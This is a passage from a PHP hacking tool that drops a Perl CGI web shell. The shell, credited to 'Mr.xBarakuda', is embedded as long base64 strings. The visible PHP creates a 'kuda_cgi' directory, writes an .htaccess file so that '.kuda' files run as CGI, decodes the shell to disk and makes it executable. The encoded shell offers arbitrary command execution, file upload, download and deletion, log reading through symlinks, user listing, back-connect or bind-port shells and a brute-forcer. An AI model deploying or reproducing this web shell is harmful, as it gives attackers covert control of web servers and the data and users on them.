cj48dGg+UGF0aCBMb2c8L3RoPjx0aD5TdWJtaXQ8L3RoPjwvdHI+IjsNCglteSBAcGF0aGxvZz0oDQoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nJywNCgkJCQknL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nJywNCgkJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9hY2Nlc3NfbG9nJw0KCQkJCSk7DQoJbXkgJGk9MDsNCglteSAkcGVybXM7DQoJbXkgJHNsOw0KCWZvcmVhY2ggbXkgJGxvZyAoQHBhdGhsb2cpDQoJew0KCQlpZigtdyAkbG9nKQ0KCQl7DQoJCQkkcGVybXM9Ik9LIjsNCgkJfWVsc2UNCgkJew0KCQkJY2hvcCgkc2wgPSBgbG4gLXMgJGxvZyBlcnJvcl9sb2dfJGlgKTsNCgkJCWlmKCZ0cmltKCRscykgZXEgIiIpDQoJCQl7DQoJCQkJaWYoLXIgJGxzKQ0KCQkJCXsNCgkJCQkJJHBlcm1zPSJPSyI7DQoJCQkJCSRsb2c9ImVycm9yX2xvZ18iLiRpOw0KCQkJCX0NCgkJCX1lbHNlDQoJCQl7DQoJCQkJJHBlcm1zPSI8Zm9udCBzdHlsZT0nY29sb3I6IHJlZDsnPkNhbmNlbDxmb250PiI7DQoJCQl9DQoJCX0NCgkJJHJlc3VsdCAuPTw8RU5EOw0KCQk8dHI+DQoNCgkJCTxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KCQkJPHRkPjxpbnB1dCB0eXBlPSJ0ZXh0IiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9nXyRpJykudmFsdWU9J2xlc3MgJyArIHRoaXMudmFsdWU7IiB2YWx1ZT0iJGxvZyIgc2l6ZT0nNTAnLz48L3RkPg0KCQkJPHRkPjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJUcnkiIC8+PC90ZD4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJsb2dfJGkiIG5hbWU9ImMiIHZhbHVlPSJsZXNzICRsb2ciLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIiAvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIiAvPg0KCQkJPC9mb3JtPg0KCQkJPHRkPiRwZXJtczwvdGQ+DQoNCgkJPC90cj4NCkVORA0KCQkkaSsrOw0KCX0NCgkkcmVzdWx0IC49IjwvdGFibGU+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb25zID0gJGlueydvJ307DQokQWN0aW9uID0gJGlueydhJ307DQoNCiRBY3Rpb24gPSAiY29tbWFuZCIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAmdHJpbSgkaW57J2QnfSk7DQojIG1hYyBkaW5oIHh1YXQgdGhvbmcgdGluIG5ldSBrbyBjbyBsZW5oIG5hbyENCiRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIiBpZigkUnVuQ29tbWFuZCBlcSAiIik7DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pIAkJIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJmb3JtTG9naW47DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZ3VpIikgIyBHVUkgZGlyZWN0b3J5DQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglpZighJFdpbk5UKQ0KCXsNCgkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOw0KCQlpZighKCRjaG1vZCBlcSAwKSkNCgkJew0KCQkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOw0KCQkJJGZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgkJCWNob3AoJHJlc3VsdD0gYGNobW9kICRjaG1vZCAiJGZpbGUiYCk7DQoJCQlpZigmdHJpbSgkcmVzdWx0KSBlcSAiIikNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJCQl9ZWxzZQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJCQl9DQoJCX0NCgl9DQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9Ow0KCWlmKCEkcmVuYW1lIGVxICIiKQ0KCXsNCgkJaWYocmVuYW1lKCRUcmFuc2ZlckZpbGUsJHJlbmFtZSkpDQoJCXsNCgkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgkJfWVsc2UNCgkJew0KCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgkJfQ0KCX0NCgkkcmVtb3ZlPSRpbnsncmVtb3ZlJ307DQoJaWYoJHJlbW92ZSBuZSAiIikNCgl7DQoJCSRybSA9ICRDdXJyZW50RGlyLiRQYXRoU2VwLiRyZW1vdmU7DQoJCWlmKC1kICRybSkNCgkJew0KCQkJJlJtRGlyKCRybSk7DQoJCX1lbHNlDQoJCXsNCgkJCWlmKHVubGluaygkcm0pKQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgkJCX1lbHNlDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgkJCX0JCQkNCgkJfQ0KCX0NCglwcmludCAmTGlzdERpcjsNCg0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiY29tbWFuZCIpCQkJCSAJIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJcHJpbnQgJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAic2F2ZSIpCQkJCSAJIyB1c2VyIHdhbnRzIHRvIHNhdmUgYSBmaWxlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglpZigmU2F2ZUZpbGUoJGlueydkYXRhJ30sJGlueydmaWxlJ30pKQ0KCXsNCgkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCX1lbHNlDQoJew0KCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCX0NCglwcmludCAmTGlzdERpcjsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpIAkJCQkJIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KDQoJcHJpbnQgJlVwbG9hZEZpbGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJiYWNrYmluZCIpIAkJCQkjIHVzZXIgd2FudHMgdG8gYmFjayBjb25uZWN0IG9yIGJpbmQgcG9ydA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImNsaWVudHBvcnQiKTsNCglwcmludCAmQmFja0JpbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJicnV0ZWZvcmNlciIpIAkJCSMgdXNlciB3YW50cyB0byBicnV0ZSBmb3JjZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoJcHJpbnQgJkJydXRlRm9yY2VyOw0KfWVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgCQkJCSMgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUNCnsNCglwcmludCAmRG93bmxvYWRGaWxlOw0KfWVsc2lmKCRBY3Rpb24gZXEgImNoZWNrbG9nIikgCQkJCSMgdXNlciB3YW50cyB0byB2aWV3IGxvZyBmaWxlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0xvZzsNCg0KfWVsc2lmKCRBY3Rpb24gZXEgImRvbWFpbnN1c2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbGlzdCB1c2VyL2RvbWFpbg0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoJcHJpbnQgJlZpZXdEb21haW5Vc2VyOw0KfWVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpIAkJCQkjIHVzZXIgd2FudHMgdG8gbG9nb3V0DQp7DQoJJlBlcmZvcm1Mb2dvdXQ7DQp9DQomUHJpbnRQYWdlRm9vdGVyOw==";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<center>Done <a href='kuda_cgi/cgi.kuda' target='_blank'><font color='lime'>Click Here</a></font>";
}
if(isset($_POST['cgi2'])) {
	$cgi_dir = mkdir('kuda_cgi', 0755);
        chdir('kuda_cgi');
	$file_cgi = "cgi2.kuda";
        $memeg = ".htaccess";
	$isi_htcgi = "Options Indexes Includes ExecCGI FollowSymLinks\nAddType application/x-httpd-cgi .kuda\nAddHandler cgi-script .kuda\nAddHandler cgi-script .kuda";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojIENvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhDQojIFJlY29kZWQgQnkgTXIueEJhcmFrdWRhDQojIFRoYW5rcyBUbyA6IDB4MTk5OSAtIFhhaSBTeW5kaWNhdGUgVGVhbSAtIEFuZCBZb3UNCiANCiRXaW5OVCA9IDA7DQokTlRDbWRTZXAgPSAiJiI7DQokVW5peENtZFNlcCA9ICI7IjsNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7DQokU2hvd0R5bmFtaWNPdXRwdXQgPSAxOw0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQpzdWIgUmVhZFBhcnNlDQp7DQogICAgbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCiAgICBsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOw0KICAgDQogICAgJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQogDQogICAgaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCiAgICB7DQogICAgICAgICRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KICAgIH0NCiAgICBlbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCiAgICB7DQogICAgICAgIGJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCiAgICAgICAgcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCiAgICB9DQogDQogICAgIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQ0KICAgIGlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQ0KICAgIHsNCiAgICAgICAgJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2Nw0KICAgICAgICBAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOw0KICAgICAgICAkSGVhZGVyQm9keSA9ICRsaXN0WzFdOw0KICAgICAgICAkSGVhZGVyQm9keSA9fiAvXHJcblxyXG58XG5cbi87DQogICAgICAgICRIZWFkZXIgPSAkYDsNCiAgICAgICAgJEJvZHkgPSAkJzsNCiAgICAgICAgJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQ0KICAgICAgICAkaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsNCiAgICAgICAgJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOw0KICAgICAgICAkaW57J2YnfSA9ICQxOw0KICAgICAgICAkaW57J2YnfSA9fiBzL1wiLy9nOw0KICAgICAgICAkaW57J2YnfSA9fiBzL1xzLy9nOw0KIA0KICAgICAgICAjIHBhcnNlIHRyYWlsZXINCiAgICAgICAgZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCiAgICAgICAgew0KICAgICAgICAgICAgJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQogICAgICAgICAgICAkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQogICAgICAgICAgICAka2V5ID0gJDE7DQogICAgICAgICAgICAkdmFsID0gJCc7DQogICAgICAgICAgICAkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KICAgICAgICAgICAgJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiAgICAgICAgICAgICRpbnska2V5fSA9ICR2YWw7DQogICAgICAgIH0NCiAgICB9DQogICAgZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpDQogICAgew0KICAgICAgICBAaW4gPSBzcGxpdCgvJi8sICRpbik7DQogICAgICAgIGZvcmVhY2ggJGkgKDAgLi4gJCNpbikNCiAgICAgICAgew0KICAgICAgICAgICAgJGluWyRpXSA9fiBzL1wrLyAvZzsNCiAgICAgICAgICAgICgka2V5LCAkdmFsKSA9IHNwbGl0KC89LywgJGluWyRpXSwgMik7DQogICAgICAgICAgICAka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KICAgICAgICAgICAgJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiAgICAgICAgICAgICRpbnska2V5fSAuPSAiXDAiIGlmIChkZWZpbmVkKCRpbnska2V5fSkpOw0KICAgICAgICAgICAgJGlueyRrZXl9IC49ICR2YWw7DQogICAgICAgIH0NCiAgICB9DQp9DQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQokRW5jb2RlZEN1cnJlbnREaXIgPSAkQ3VycmVudERpcjsNCiRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50IDw8RU5EOw0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Nci54QmFyYWt1ZGE8L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQo8c3R5bGU+DQpAZm9udC1mYWNlIHsNCiAgICBmb250LWZhbWlseTogJ3VidW50dV9tb25vcmVndWxhcic7DQpzcmM6IHVybChkYXRhOmFwcGxpY2F0aW9uL3gtZm9udC13b2ZmO2NoYXJzZXQ9dXRmLTg7YmFzZTY0LGQwOUdSZ0FCQUFBQUFHV0lBQk1BQUFBQXZEQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCR1JsUk5BQUFCcUFBQUFCd0FBQUFjWk8rSGRFZEVSVVlBQUFIRUFBQUFLUUFBQUN3Q0l3RUpSMUJQVXdBQUFmQUFBQUF5QUFBQVFEWE9UckJIVTFWQ0FBQUNKQUFBQVZrQUFBSUdsTnZKcUU5VEx6SUFBQU9BQUFBQVhRQUFBR0NaVlFUWlkyMWhjQUFBQStBQUFBR09BQUFCNmdDTGpCWmpkblFnQUFBRmNBQUFBRW9BQUFCS0Uwa09jMlp3WjIwQUFBVzhBQUFCc1FBQUFtVlR0QytuWjJGemNBQUFCM0FBQUFBSUFBQUFDQUFBQUJCbmJIbG1BQUFIZUFBQVZtRUFBS1cwSXJ0MlBHaGxZV1FBQUYzY0FBQUFNQUFBQURZQXkyTERhR2hsWVFBQVhnd0FBQUFjQUFBQUpBcW1CUDlvYlhSNEFBQmVLQUFBQVdnQUFBT2lobUZ4Q0d4dlkyRUFBRitRQUFBQnlBQUFBZFFPVVRhUWJXRjRjQUFBWVZnQUFBQWdBQUFBSUFJR0FoVnVZVzFsQUFCaGVBQUFBWHNBQUFQT1lsZUtyWEJ2YzNRQUFHTDBBQUFCNGdBQUF0UXNCcVVNY0hKbGNBQUFaTmdBQUFDbkFBQUJCcVFUdkc1M1pXSm1BQUJsZ0FBQUFBWUFBQUFHZFZ0U3BnQUFBQUVBQUFBQXpEMml6d0FBQUFESjViN0xBQUFBQU03TUpkbDQybU5nWkdCZzRBTmlGUVlRWUdKZ0J1STZCa2FHZW9aR0lLdUo0UVdRelFLV1lRQUFObUlETFFBQUFIamFZMkJrWUdEZ1lyQmhzR05nVHE0c3ltRVFTUzlLeldhUXkwa3N5V1BRWUdBQnlqTDgvdzhrc0xHQUFBQjNrd3Y3QUFCNDJuV1J4MHBEUVJpRnYrczFMa0p3RlF2aUlvZ2w5aGhqTDhRU0JHTU1YRjI1RUdLTUxrd2kzQmhCaVN0Nzd3MDdQb1c0czd5SUw2Si9ob3ZnUW9ZNWY1bHpaczdNb0FGMkh2bENqeTZaY1p5elpteU85bmhrSWNrd2hlajlRNGFMd2xCd1VIRE02QmVFNzI5eVJhZVJJekdiL2UyVVlldWJDTGp3RGhqamdxSHdpQXUvRVE0SmpodEI2U2kremVMcldlVWZmYmJTcGNybXRzaU1HY1VWamFSaXVKUHBoRW5EdkRtZHhKZEtlYngwS2xhT1ltdldEaWpVZmxkc09IQlNTamwxcXF2aHRtS3JGZjNrcVRocTFWT2ljNGd5UTVwRnFYVUs1TlpGMHJYTFRMQ2lmQVlZKzRlblMxNHNNOS95b3F2MWpPVnBXVnhYVUVtVitLaW1obHJ4VlU4RGpYaG9rcmRweGtlTGVHdWpuUTdoZHRGTkQ3MnNzc1k2RzJ5eXhUWTc3TExIUGdjY2NzUXhKNXh5eGprWFhITEZOVGZjY3NjOUQvSzNUM3p5cmw0endLUjRlT2FGRWw1NWsvTStaSFQ4QUduVlNxRUFBQUI0Mm1OZ1puN0JPSUdCbFlHRmRSYXJNUU1Eb3p5RVpyN0lrTWJFd01EQXhNM0t5Y3pHeE16RThvQ0I2WDhBZzBJMEF4UzRPUG82TWpndzhQNW1Za3Y3bDhiQXdMYUVxVStCZ1dGK0dDTlE5emFXTDBBbENneE1BTDM2RDc0QUFBQjQybU5nWUdCbWdHQVpCa1lHRUhnQzVER0MrU3dNSjRDMEhvTUNrTVVIWlBFeXlETFVNZnhuREdhc1lEckdkRWVCUzBGRVFVcEJUa0ZKUVUxQlg4RktJVjVoamFLUzZwL2ZUUC8vZzAwQ3FWZGdXTUFZQkZYUG9DQ2dJS0VnQTFWdkNWZlBDRlRQL1Avci8yZi9uL3cvL0wvd3YrOC9ocit2SDV4NGNQakJnUWY3SCt4NXNQUEJ4Z2NySHJROHNMaC8rTllyMW1kUWQ1SUFHTmtnWGdTem1ZQUVFNW9Db0NRTEt4czdCeWNYTnc4dkg3K0FvSkN3aUtpWXVJU2tsTFNNckp5OGdxS1Nzb3FxbXJxR3BwYTJqcTZldm9HaGtiR0pxWm01aGFXVnRZMnRuYjJEbzVPemk2dWJ1NGVubDdlUHI1OS9RR0JRY0Vob1dIaEVaRlIwVEd4Y2ZFSmlFa043UjFmUGxKbnpseXhldW56WmlsVnJWcTlkdDJIOXhrMWJ0bTNkdm5QSDNqMzc5ak1VcDZabDNhdGNWSmp6dER5Ym9YTTJRd2tEUTBZRjJIVzV0UXdyZHplbDVJUFllWFgzazV2YlpodytjdTM2N1RzM2J1NWlPSFNVNGNuRFI4OWZNRlRkdXN2UTJ0dlMxejFoNHFUK2FkTVpwczZkTjRmaDJQRWlvS1pxSUFZQUpvYU14QUFBQUFBRHRnVDBBSkFBaHdDSkFJc0FsZ0RJQVJJQXFBRUdBSmtBb3dDb0FLd0FzQUMyQUpVQW9RQ2NBSzRBZFFDeUFIa0FmQUNUQUtvQWpRQ2ZBS1lBZHdCdEFIQUFmd0JFQlJFQUFIamFYVkc3VGx0QkVOME5Ed09CeE5nZ09kb1VzNW1ReG51aEJRbkUxWTFpWkR1RjVRaHBOM0tSaTNFQkgwQ0JSQTNhcnhtZ29hUkltd1loRjBoOFFqNGhFak5yaUtJME96dXpjODZaTTB2S2thcDM2V3ZQVStja2tNTGRCczAyL1U1SXRiTUE5NlRyNjQyTXRJTUhXbXhtOU1wMSsvNExCcHZSbER0cUFPVTlieWtQR1UwN2dWcTBwLzdSL0FxRysvd2Y4enNZdERUVDlOUTZDZWtoQk9hYmNVdUQ3eG5OdXNzUCtvTFY0V0l3TUtTWXB1SXVQNlpTL3JjMDUyckxzTFdSMGJ5RE14SDV5VFJBVTJ0dEJKcisxQ0hWODNFVVM1RExwckUybUppeS9pUVR3WVhKZEZWVHRjejQyc0Zkc3JQb1lJTXF6WUVIMk1OV2VRd2VEZzhtRk5LM0pNb3NEUkgyWXF2RUNCR1RIQW81NWR6Si9xUkErVWdTeHJ4SlNqdmpoclVHeHBIWHdLQTJUN1AvUEp0TmJXOGR3dmhaSE1GM3Z4bExPdmpJaHRvWUVXSTdZaW1BQ1VSQ1JsWDVoaHJQdlN3RzVGTDd6MENVZ09YeGozK2RDTFR1MkVROGw3VjFEakZXQ0hwKzI5enl5NHE3VnJuT2kwSjNiNnBxcU5JcHpmdGV6cjdIQTU0ZUM4TkJZOEdiei92K1NvSDZQQ3l1TkdnT0JFTjZOM3Ivb3JYcWlLdThGejZ5SjlPL3NWb0FBQUFBQVFBQi8vOEFEM2phN0wwTmZCdmxsVGM2ejR5K0xPdGpScCtXWkZtV0ZWbFJGSGtpS1lxaU9JNGR4eGpIR05kMVhhOXJqQWtoNUF2U1lJeEpnNXYxOVdiVE5BM0JDUUdhcGlsTmFaYk41dWJOenNnaVVKZlNVTGFYc2l6TDluSWJmbHplYnJmYmJWbDNhWmRTeXZLUmlQZWNaMGIraU8yUTdiYnZlKy92OTVaYUh6UEt6SG5PYzU1ei91ZmpPY093VEJQRHNKdTBuMlk0UnMvVXlJUVJWK2YwbXRDdmtySk8rOTlYNXpnV1BqSXloNGUxZURpbjF5MjZ0RHBIOEhoS0NBcmhvQkJzWWlzTGk4aXh3bGJ0cHovNFA1czBMekZ3U1RMNDBSdnNQczA3VENuallWcVlYQW5EeEdTdVpESm5acGtZa2J5aXhGeVVkYVdUK0RkdTFUR0dtR3dTSmlXVEtGdUZTZGxIWXJMVkpOamtFaTZiWldReko5Z2tSM1paSXJ4OFJTcnBjanAwb2FwcXU1QVNIQlpXSDZyaHlHQm5KdHZSa2MxMGl1YzFSclB1SHAzWnFCbXNiMnVycjcreGpkdEdlZ3FuMjBZRzcxcFROekE0Z3JRWnVBSDJQZTFPcG9TeE16V01wQmNsUHBVbkpZeEJFNU5LazBSeVVPbzQwNlRFOGJJUmFER2JKbVVuaVRITEVpU2RndHZEVFVsNDZoTXhQT3JrdXkxTzB2bW8wOUxOTzdXT20yN3VmV1BEaGpmNjFIZTRKNU5oR080RjRJZVBDWkNibVp3WCtKRnp1anlwVkNxbkI1YmtES1VtK0p4bmlGZHZqbzJ6UXJsL2tUc2xNOXJKY1llN3pMZkluY3hyTmZRVXgxY0U4SlJXTXptdUt6R2E0UlNSS2tYSmUxSDJBTVVlWG5ZQnhVN1RKRnplR0J0dmNOcExZcElsT1c1d3VvREpldmlKWHBRTmNGcHZ3Tk42Qms1cmtwS1RsMHZoMzVsZ3BFRVNrMVo0SjliODZ6dTFqRE5tbkZqejNqdEg4SVBrNWNkWnI5NE9OTkJYSGI3Q0RjZExQQWI0NE9MSGphNVMrT0RreDgxT0UveUFwNjhDZlhYZ0svN0dUWDhELzZxTS9pdTRwcTk0bmZMaWRmejRtL0dLNGk4RGVKeHI0RmtPQjh3THlKRnlmMFdnNW9yL1NRMWVtQ0o3T21VUHdWK0tvMy9PRVAwTDJmRXZBNmN5ajlhOS9sN0RWK3AvVm5lOGJ1K2o5VCttbitIdmlaL1cvNVMwSHlETiswbEhRY0svL1lXSkE0VWNhY2MvT0E1eVRaaWRIMlc1bzlxRFRKbzV6a2dwVVZxV2tqWGNaQzZsUVdhbWtzRE1TbEYyYVdFaWtqbFhKUjUwdVV0QTRsZUlrdjJpSE9JbnBSQXZKNEhEcnFTY2dNa29TMG9KWGk0QjFzZEI4RFB3SHJLRHRKT3NsQlJrcXlXYmxSSzJuS1p5Y1JZK2xRaFNOQ3ZGYlhLNUg1ZUZKZ1UvWkxKU3BUQk83UDc0SW5kV2N0bWtjbGduOWFTQ3BKSnIyUFR5R2paU3c2V1hyOGlBdEZZUXQ3NkdoS3AwVGtjRjY2N2dVSHlkb1hRTjJSblBmSG13ZGRPcXNrVFg5bFdaSFYzcEUwZVBkUjZJaG1KN04rMGNDalgyWkpyM2JxejkrdVBIUnIrKy9RR2Y2STdWaGxJdG1aakRrV3paMUxyM2xPdVZselFWd2hnZjZteVBaZU5oaDYrMmM3Qmo5Mm5IbTcvUUpJQmxqSllKZi9SejduV3RCWFNCRmVRL3dxU1lNMHpPaENzZ0RDLzVtSVpacElsUnpRQUtCdzU0NklGOEloRG16UENtZkxPWDBHOTIrbzFJeTNHTjVua2J3OE9pNWFuUTUzWEtOeDB2bDhPM3hjcTN4YnhjQTkrcTZEYzVEUXgyOFlJdFYySUYxWktWYXhiRFozTTRrRVdHSmxEbGxGZkJZUS9NZ2F4anNzQkwrMHlkUTFLRWM3aFN5UlhwNWRYQVNETGpYR2JHOGZDdXJWdDMzYnR0Nnk0TFp6aDg2YjFnU2hRVENWRk1rVDMzd0VFNE9iUUh2K0poN29jbnZ2R05FeWRPbmJyMG91YWREMDNjRC90MjdlcUR2MHZ2bnZqR1kxODk4ZGhqSjlRRG9LSHJQM3FMZTBITE16Rm1CZFBJYkdWeVZjQStLWkxLbFFMWDVBYk5KSkhXVWRXMTFBaTZZU2txMVl4NVVsckt5M1V3YkI2V2RoTzhaNWFDMkhCWnFVN0lsMFpTeSswb043eHQzT1ZlbElDUGpOeFFKZGpPTXpwK2tiaDhGUnlnSE1qVWtQVHlOV3dxV2NHaTFMaEJsTmFRak50QzlQQXBWQjJ4Z0ZqVnNCbEhCY0dmd2xlN3d3Vy9VTGhSZi91ZDZiV3A3cnRXcHplM2kvZDlvVG5VRnVFOXVrTW1NU1IyaDNLaFdPTmpQZTMzZFM4NzA3bnI0S3FtSTQyMXF6dkNxemQyZHFUU041UDBodTkzdFJ4dDc5aDFRNlN5YVdORC8vTmROMGE3eE96K1R0dXViOS9RZUxDOVpXM245YW5lWFowZDI3eTFuWDJQdHFmdlovdHFON2ZYM1YvYnVyNEwxeXQ1bkd0amUwRFhtNWtnSTVXSXFwb25ra1hSOGZ3ay9iTk9LM2ZWcER5ZTB4bk5ocTBHczFHSCtqeCt6NTdkb3JoN3o3Mm9BOTRvbk9IYzJoTU1EL2FEU0FLOWtzRThLZHZvVmV6TGJSbDNTTWZTVmFhdlp0LzQ1V1F2Kzh3TDRxMFBiN241elRmWWNJRzhmR2I0YU9GUGZ6YjQwdE5Tei9BNTh0TE1hOXJvTmUyaVpMa29hK0NhRHVXYUdaZU5XcnRJYW9VTlYvVWJjS25WUStmdXVZbDc1a1h4dG9lMXdlRnpoZFJIek1pN1AzdXhhL2dvR2YyWHdiLzdqb1RYSFd